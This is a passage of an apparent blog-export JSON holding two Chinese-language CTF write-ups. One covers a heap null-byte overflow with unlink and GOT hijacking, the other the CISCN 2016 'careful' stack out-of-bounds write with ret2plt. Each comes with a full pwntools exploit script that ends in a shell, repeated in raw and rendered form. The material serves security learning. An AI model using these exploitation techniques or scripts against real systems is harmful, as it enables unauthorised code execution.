class=\"line\">GOT_free=<span class=\"number\">0x602018</span></div><div class=\"line\">GOT_read=<span class=\"number\">0x602040</span></div><div class=\"line\">FD=<span class=\"number\">0x6020C8</span></div><div class=\"line\">BK=<span class=\"number\">0x6020D0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init</span><span class=\"params\">(size)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'length:'</span>)</div><div class=\"line\">\tio.sendline(str(size))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Done~'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index,content)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(str(index))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'content:'</span>)</div><div class=\"line\">\tio.sendline(str(content))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Done~'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(str(index))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Done~'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span><span class=\"params\">(dst)</span>:</span></div><div class=\"line\">\tedit(<span class=\"number\">1</span>,p64(dst)+p64(SIZE)[:<span class=\"number\">-1</span>])</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'0'</span>)</div><div class=\"line\">\tleakmem = io.recvuntil(<span class=\"string\">\"Done~\"</span>)[:<span class=\"number\">-6</span>]</div><div class=\"line\">\t<span class=\"keyword\">return</span> str(leakmem)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\"></div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\"></div><div class=\"line\">\tpayload=p64(<span class=\"number\">0xf1</span>)+p64(<span class=\"number\">0xf1</span>)+p64(FD)+p64(BK)+<span class=\"string\">'A'</span>*<span class=\"number\">0xd0</span>+p64(<span class=\"number\">0xf0</span>)</div><div class=\"line\">\t<span class=\"comment\"># overflow null byte</span></div><div class=\"line\">\tedit(<span class=\"number\">2</span>,payload)</div><div class=\"line\">        <span class=\"comment\"># gdb.attach(io,execute=(\"b *%s\"%(0x400CCF)))</span></div><div class=\"line\">\tdelete(<span class=\"number\">3</span>)</div><div class=\"line\">        </div><div class=\"line\">\tpayload2=p64(SIZE)+p64(<span class=\"number\">0x6020C0</span>)+p64(SIZE)+p64(GOT_free)+p64(SIZE)</div><div class=\"line\">\tedit(<span class=\"number\">2</span>,payload2)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># modify GOT entry of free to PLT entry of puts</span></div><div class=\"line\">\t<span class=\"comment\"># use [:1] to prevent \\x00 from causing damage</span></div><div class=\"line\">\tedit(<span class=\"number\">2</span>,p64(PLT_puts)[:<span class=\"number\">-1</span>])</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># leak read_addr</span></div><div class=\"line\">\tread_addr=u64(leak(GOT_read).ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">\"read_addr: \"</span>+str(hex(read_addr))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">\tsystem_addr=read_addr<span class=\"number\">-0x980C0</span></div><div class=\"line\">\t<span class=\"comment\"># system_addr= read_addr-0xeb6a0 +0x46590</span></div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"comment\"># modify free to system</span></div><div class=\"line\">\tedit(<span class=\"number\">2</span>,p64(system_addr)[:<span class=\"number\">-1</span>])</div><div class=\"line\">\tedit(<span class=\"number\">4</span>,<span class=\"string\">\"/bin/sh\"</span>)</div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"comment\"># now get shell</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'4'</span>)</div><div class=\"line\"></div><div class=\"line\">\tio.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>\n","excerpt":"<p>一道堆中的null byte溢出题</p>\n<p>程序用连续两个8 bytes变量分别存储分配的堆指针和其size，然后将这样的结构体以数组的形式存储在全局变量区0x6020C0。主要逻辑就是每次新建一个message的时候，从0x6020C0开始找size为0的地方，之后调用malloc分配目标大小存储堆指针，删除的时候会先清size为0再调用free()释放内存</p>","more":"<p>由于读取输入的时候会在最后再添加’\\x00’：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">.text:00000000004008E4                 cdqe</div><div class=\"line\">.text:00000000004008E6                 lea     rdx, [rax-1]</div><div class=\"line\">.text:00000000004008EA                 mov     rax, [rbp+var_18]</div><div class=\"line\">.text:00000000004008EE                 add     rax, rdx</div><div class=\"line\">.text:00000000004008F1                 mov     byte ptr [rax], 0</div><div class=\"line\">.text:00000000004008F4                 mov     eax, [rbp+var_8]</div><div class=\"line\">.text:00000000004008F7                 sub     eax, 1</div></pre></td></tr></table></figure></p>\n<p>所以可以构造payload溢出下一块chunk的size中的prev_inuse位，伪造prevsize字段，触发free()向前合并，就可以导致unlink使用我们伪造的fd和bk指针改写当前chunk的堆指针，使其指向0x6020C8（一开始忘了堆的对齐是加8 bytes再对齐，结果怎么也溢不出来…）</p>\n<p>之后再编辑被修改过的堆指针就可以直接修改全局变量区了，由于只开了Partial级别的RELRO：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">CANARY    : ENABLED</div><div class=\"line\">FORTIFY   : disabled</div><div class=\"line\">NX        : ENABLED</div><div class=\"line\">PIE       : disabled</div><div class=\"line\">RELRO     : Partial</div></pre></td></tr></table></figure>\n<p>所以可以考虑劫持free()的GOT到库中的system()，然后再有一个/bin/sh写在chunk中就可以拿shell了，在这之前得先泄漏一下库的地址过掉ASLR，所以先把free的GOT劫持到puts的PLT上，泄漏一下read()的地址，这里可以用<a href=\"https://github.com/niklasb/libc-database\">libc-database</a>这个工具来查找远程库的版本（但是不知道为什么我本地的库版本查不出来，只能手动查偏移），因为ASLR不会影响低12位的地址</p>\n<p>然后泄漏出来算下偏移就可以调用system()了</p>\n<p>Exploit:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></div><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">io=process(<span class=\"string\">'./fb'</span>)</div><div class=\"line\"><span class=\"comment\"># io = remote(\"114.55.103.213\",9733)</span></div><div class=\"line\"></div><div class=\"line\">SIZE=<span class=\"number\">0xf8</span></div><div class=\"line\">PLT_puts=<span class=\"number\">0x4006C0</span></div><div class=\"line\">GOT_free=<span class=\"number\">0x602018</span></div><div class=\"line\">GOT_read=<span class=\"number\">0x602040</span></div><div class=\"line\">FD=<span class=\"number\">0x6020C8</span></div><div class=\"line\">BK=<span class=\"number\">0x6020D0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init</span><span class=\"params\">(size)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'length:'</span>)</div><div class=\"line\">\tio.sendline(str(size))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Done~'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index,content)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(str(index))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'content:'</span>)</div><div class=\"line\">\tio.sendline(str(content))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Done~'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete</span><span class=\"params\">(index)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(str(index))</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Done~'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">leak</span><span class=\"params\">(dst)</span>:</span></div><div class=\"line\">\tedit(<span class=\"number\">1</span>,p64(dst)+p64(SIZE)[:<span class=\"number\">-1</span>])</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'0'</span>)</div><div class=\"line\">\tleakmem = io.recvuntil(<span class=\"string\">\"Done~\"</span>)[:<span class=\"number\">-6</span>]</div><div class=\"line\">\t<span class=\"keyword\">return</span> str(leakmem)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\"></div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\">\tinit(SIZE)</div><div class=\"line\"></div><div class=\"line\">\tpayload=p64(<span class=\"number\">0xf1</span>)+p64(<span class=\"number\">0xf1</span>)+p64(FD)+p64(BK)+<span class=\"string\">'A'</span>*<span class=\"number\">0xd0</span>+p64(<span class=\"number\">0xf0</span>)</div><div class=\"line\">\t<span class=\"comment\"># overflow null byte</span></div><div class=\"line\">\tedit(<span class=\"number\">2</span>,payload)</div><div class=\"line\">        <span class=\"comment\"># gdb.attach(io,execute=(\"b *%s\"%(0x400CCF)))</span></div><div class=\"line\">\tdelete(<span class=\"number\">3</span>)</div><div class=\"line\">        </div><div class=\"line\">\tpayload2=p64(SIZE)+p64(<span class=\"number\">0x6020C0</span>)+p64(SIZE)+p64(GOT_free)+p64(SIZE)</div><div class=\"line\">\tedit(<span class=\"number\">2</span>,payload2)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># modify GOT entry of free to PLT entry of puts</span></div><div class=\"line\">\t<span class=\"comment\"># use [:1] to prevent \\x00 from causing damage</span></div><div class=\"line\">\tedit(<span class=\"number\">2</span>,p64(PLT_puts)[:<span class=\"number\">-1</span>])</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># leak read_addr</span></div><div class=\"line\">\tread_addr=u64(leak(GOT_read).ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">\"read_addr: \"</span>+str(hex(read_addr))</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\">\tsystem_addr=read_addr<span class=\"number\">-0x980C0</span></div><div class=\"line\">\t<span class=\"comment\"># system_addr= read_addr-0xeb6a0 +0x46590</span></div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"comment\"># modify free to system</span></div><div class=\"line\">\tedit(<span class=\"number\">2</span>,p64(system_addr)[:<span class=\"number\">-1</span>])</div><div class=\"line\">\tedit(<span class=\"number\">4</span>,<span class=\"string\">\"/bin/sh\"</span>)</div><div class=\"line\">\t</div><div class=\"line\">\t<span class=\"comment\"># now get shell</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Choice:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'4'</span>)</div><div class=\"line\"></div><div class=\"line\">\tio.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>"},{"title":"Ciscn CTF 2016 careful writeup","date":"2016-07-11T09:13:00.000Z","_content":"\n现在才知道原来system(\"sh\")也可以拿shell……一直以为只能用system(\"/bin/sh\")……\n\n题目是挺简单的，not stripped，PLT中直接有system入口，程序从main函数直接进initarray函数然后就没了，在initarray里有一个循环10次读一个字节到数组中，但是index可以越界，所以可以改写栈内存（同时又能把计循环次数的变量也给改了，所以可以无限循环）：\n\n<!--more-->\n\n![ciscnctf_2016_careful_writeup0.png][1]\n\n\n循环读完之后会把原来的数组位置print出来，不过这段似乎并没有什么卵用。\n\n由于PLT中已经有了system入口了，所以来个/bin/sh的地址就行了，于是为了这个地址我开始漫长的计划，先修改返回地址为printf构造参数泄漏出printf地址，找个pop｜ret的gadget再跳回循环读的地方，用system的PLT入口和算出来的/bin/sh地址再修改返回地址，完美，简直完美。\n\n完美个屁libc-database查不出远程glibc版本算不出偏移玩个毛线。\n\n后来才知道原来只要\"sh\"其实也是可以的，用ROPgadget搜出个\"sh\"就可以了,我真的是拒绝的。\n\n于是这么大一圈白绕了真尴尬，写都写了舍不得删，留作个too young的纪念吧。\n\n```python\nfrom pwn import *\nfrom ctypes import *\n\np=process('./careful')\n# p=remote('106.75.32.79',10000)\n\n# popret='080483a1'\n# printf='080483c0'\n# fflush='080483d0'\n# system='080483e0'\n# print_got='0804a00c'\n# begin='0804852D'\n# out='08048563'\n\nsystem='080483e0'\nsh='0804828e'\n\ndef w(index,value):\n\tp.recvuntil('index:')\n\tp.sendline(str(index))\n\tp.recvuntil('value:')\n\tvalue='0A0A0A'+value\n\tc=c_int32(int(value,16)).value\n\tp.sendline(str(c))\n\ndef reset():\n\tw(28,'00')\n\ndef end():\n\tw(28,'11')\n\ndef wdword(index,word):\n\tw(index,word[6:])\n\tw(index+1,word[4:6])\n\tw(index+2,word[2:4])\n\tw(index+3,word[0:2])\n\treset()\n\ndef main():\n\t\"\"\"\n\t# write print addr\n\twdword(44,printf)\n\twdword(48,popret)\n\twdword(52,print_got)\n\twdword(56,begin)\n\t# wdword(60,popret)\n\t# wdword(64,out)\n\t# wdword(68,begin)\n\t# gdb.attach(p,'b *0x8048604')\n\tend()\n\n\trecv=p.recv(4)\n\n\tsys_addr=u32(recv.ljust(4,'\\x00'))\n\tprint 'system addr: '+hex(sys_addr)\n\tsh_addr=sys_addr-0x4cbd0+0x15d1a9\n\tprint '/bin/sh addr: '+hex(sh_addr)\n\n\t# gdb.attach(p,'b *0x08048604')\n\tp.sendline('28')\n\tp.recvuntil('value:')\n        value='0A0A0A00'\n        c=c_int32(int(value,16)).value\n\tp.sendline(str(c))\n\n\twdword(44,system)\n\twdword(52,hex(sh_addr)[2:])\n\tend()\n\t# gdb.attach(p,'b *0x8048604')\n\tp.interactive()\n\t\"\"\"\n\twdword(44,system)\n\twdword(52,sh)\n\tend()\n\tp.interactive()\n\nmain()\n\n```\n\n\n[1]: /images/ciscnctf_2016_careful_writeup0.png\n","source":"_posts/ciscnctf_2016_careful_writeup.md","raw":"title: Ciscn CTF 2016 careful writeup\n\ndate: 2016/07/11 17:13:00\n\n---\n\n现在才知道原来system(\"sh\")也可以拿shell……一直以为只能用system(\"/bin/sh\")……\n\n题目是挺简单的，not stripped，PLT中直接有system入口，程序从main函数直接进initarray函数然后就没了，在initarray里有一个循环10次读一个字节到数组中，但是index可以越界，所以可以改写栈内存（同时又能把计循环次数的变量也给改了，所以可以无限循环）：\n\n<!--more-->\n\n![ciscnctf_2016_careful_writeup0.png][1]\n\n\n循环读完之后会把原来的数组位置print出来，不过这段似乎并没有什么卵用。\n\n由于PLT中已经有了system入口了，所以来个/bin/sh的地址就行了，于是为了这个地址我开始漫长的计划，先修改返回地址为printf构造参数泄漏出printf地址，找个pop｜ret的gadget再跳回循环读的地方，用system的PLT入口和算出来的/bin/sh地址再修改返回地址，完美，简直完美。\n\n完美个屁libc-database查不出远程glibc版本算不出偏移玩个毛线。\n\n后来才知道原来只要\"sh\"其实也是可以的，用ROPgadget搜出个\"sh\"就可以了,我真的是拒绝的。\n\n于是这么大一圈白绕了真尴尬，写都写了舍不得删，留作个too young的纪念吧。\n\n```python\nfrom pwn import *\nfrom ctypes import *\n\np=process('./careful')\n# p=remote('106.75.32.79',10000)\n\n# popret='080483a1'\n# printf='080483c0'\n# fflush='080483d0'\n# system='080483e0'\n# print_got='0804a00c'\n# begin='0804852D'\n# out='08048563'\n\nsystem='080483e0'\nsh='0804828e'\n\ndef w(index,value):\n\tp.recvuntil('index:')\n\tp.sendline(str(index))\n\tp.recvuntil('value:')\n\tvalue='0A0A0A'+value\n\tc=c_int32(int(value,16)).value\n\tp.sendline(str(c))\n\ndef reset():\n\tw(28,'00')\n\ndef end():\n\tw(28,'11')\n\ndef wdword(index,word):\n\tw(index,word[6:])\n\tw(index+1,word[4:6])\n\tw(index+2,word[2:4])\n\tw(index+3,word[0:2])\n\treset()\n\ndef main():\n\t\"\"\"\n\t# write print addr\n\twdword(44,printf)\n\twdword(48,popret)\n\twdword(52,print_got)\n\twdword(56,begin)\n\t# wdword(60,popret)\n\t# wdword(64,out)\n\t# wdword(68,begin)\n\t# gdb.attach(p,'b *0x8048604')\n\tend()\n\n\trecv=p.recv(4)\n\n\tsys_addr=u32(recv.ljust(4,'\\x00'))\n\tprint 'system addr: '+hex(sys_addr)\n\tsh_addr=sys_addr-0x4cbd0+0x15d1a9\n\tprint '/bin/sh addr: '+hex(sh_addr)\n\n\t# gdb.attach(p,'b *0x08048604')\n\tp.sendline('28')\n\tp.recvuntil('value:')\n        value='0A0A0A00'\n        c=c_int32(int(value,16)).value\n\tp.sendline(str(c))\n\n\twdword(44,system)\n\twdword(52,hex(sh_addr)[2:])\n\tend()\n\t# gdb.attach(p,'b *0x8048604')\n\tp.interactive()\n\t\"\"\"\n\twdword(44,system)\n\twdword(52,sh)\n\tend()\n\tp.interactive()\n\nmain()\n\n```\n\n\n[1]: /images/ciscnctf_2016_careful_writeup0.png\n","slug":"ciscnctf_2016_careful_writeup","published":1,"updated":"2016-11-01T13:30:38.884Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuzk2ok70000r1608jt7cusq","content":"<p>现在才知道原来system(“sh”)也可以拿shell……一直以为只能用system(“/bin/sh”)……</p>\n<p>题目是挺简单的，not stripped，PLT中直接有system入口，程序从main函数直接进initarray函数然后就没了，在initarray里有一个循环10次读一个字节到数组中，但是index可以越界，所以可以改写栈内存（同时又能把计循环次数的变量也给改了，所以可以无限循环）：</p>\n<a id=\"more\"></a>\n<p><img src=\"/images/ciscnctf_2016_careful_writeup0.png\" alt=\"ciscnctf_2016_careful_writeup0.png\"></p>\n<p>循环读完之后会把原来的数组位置print出来，不过这段似乎并没有什么卵用。</p>\n<p>由于PLT中已经有了system入口了，所以来个/bin/sh的地址就行了，于是为了这个地址我开始漫长的计划，先修改返回地址为printf构造参数泄漏出printf地址，找个pop｜ret的gadget再跳回循环读的地方，用system的PLT入口和算出来的/bin/sh地址再修改返回地址，完美，简直完美。</p>\n<p>完美个屁libc-database查不出远程glibc版本算不出偏移玩个毛线。</p>\n<p>后来才知道原来只要”sh”其实也是可以的，用ROPgadget搜出个”sh”就可以了,我真的是拒绝的。</p>\n<p>于是这么大一圈白绕了真尴尬，写都写了舍不得删，留作个too young的纪念吧。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">p=process(<span class=\"string\">'./careful'</span>)</div><div class=\"line\"><span class=\"comment\"># p=remote('106.75.32.79',10000)</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># popret='080483a1'</span></div><div class=\"line\"><span class=\"comment\"># printf='080483c0'</span></div><div class=\"line\"><span class=\"comment\"># fflush='080483d0'</span></div><div class=\"line\"><span class=\"comment\"># system='080483e0'</span></div><div class=\"line\"><span class=\"comment\"># print_got='0804a00c'</span></div><div class=\"line\"><span class=\"comment\"># begin='0804852D'</span></div><div class=\"line\"><span class=\"comment\"># out='08048563'</span></div><div class=\"line\"></div><div class=\"line\">system=<span class=\"string\">'080483e0'</span></div><div class=\"line\">sh=<span class=\"string\">'0804828e'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">w</span><span class=\"params\">(index,value)</span>:</span></div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tp.sendline(str(index))</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'value:'</span>)</div><div class=\"line\">\tvalue=<span class=\"string\">'0A0A0A'</span>+value</div><div class=\"line\">\tc=c_int32(int(value,<span class=\"number\">16</span>)).value</div><div class=\"line\">\tp.sendline(str(c))</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">reset</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tw(<span class=\"number\">28</span>,<span class=\"string\">'00'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">end</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tw(<span class=\"number\">28</span>,<span class=\"string\">'11'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wdword</span><span class=\"params\">(index,word)</span>:</span></div><div class=\"line\">\tw(index,word[<span class=\"number\">6</span>:])</div><div class=\"line\">\tw(index+<span class=\"number\">1</span>,word[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</div><div class=\"line\">\tw(index+<span class=\"number\">2</span>,word[<span class=\"number\">2</span>:<span class=\"number\">4</span>])</div><div class=\"line\">\tw(index+<span class=\"number\">3</span>,word[<span class=\"number\">0</span>:<span class=\"number\">2</span>])</div><div class=\"line\">\treset()</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\t<span class=\"string\">\"\"\"</span></div><div class=\"line\">\t# write print addr</div><div class=\"line\">\twdword(44,printf)</div><div class=\"line\">\twdword(48,popret)</div><div class=\"line\">\twdword(52,print_got)</div><div class=\"line\">\twdword(56,begin)</div><div class=\"line\">\t# wdword(60,popret)</div><div class=\"line\">\t# wdword(64,out)</div><div class=\"line\">\t# wdword(68,begin)</div><div class=\"line\">\t# gdb.attach(p,'b *0x8048604')</div><div class=\"line\">\tend()</div><div class=\"line\"></div><div class=\"line\">\trecv=p.recv(4)</div><div class=\"line\"></div><div class=\"line\">\tsys_addr=u32(recv.ljust(4,'\\x00'))</div><div class=\"line\">\tprint 'system addr: '+hex(sys_addr)</div><div class=\"line\">\tsh_addr=sys_addr-0x4cbd0+0x15d1a9</div><div class=\"line\">\tprint '/bin/sh addr: '+hex(sh_addr)</div><div class=\"line\"></div><div class=\"line\">\t# gdb.attach(p,'b *0x08048604')</div><div class=\"line\">\tp.sendline('28')</div><div class=\"line\">\tp.recvuntil('value:')</div><div class=\"line\">        value='0A0A0A00'</div><div class=\"line\">        c=c_int32(int(value,16)).value</div><div class=\"line\">\tp.sendline(str(c))</div><div class=\"line\"></div><div class=\"line\">\twdword(44,system)</div><div class=\"line\">\twdword(52,hex(sh_addr)[2:])</div><div class=\"line\">\tend()</div><div class=\"line\">\t# gdb.attach(p,'b *0x8048604')</div><div class=\"line\">\tp.interactive()</div><div class=\"line\">\t\"\"\"</div><div class=\"line\">\twdword(<span class=\"number\">44</span>,system)</div><div 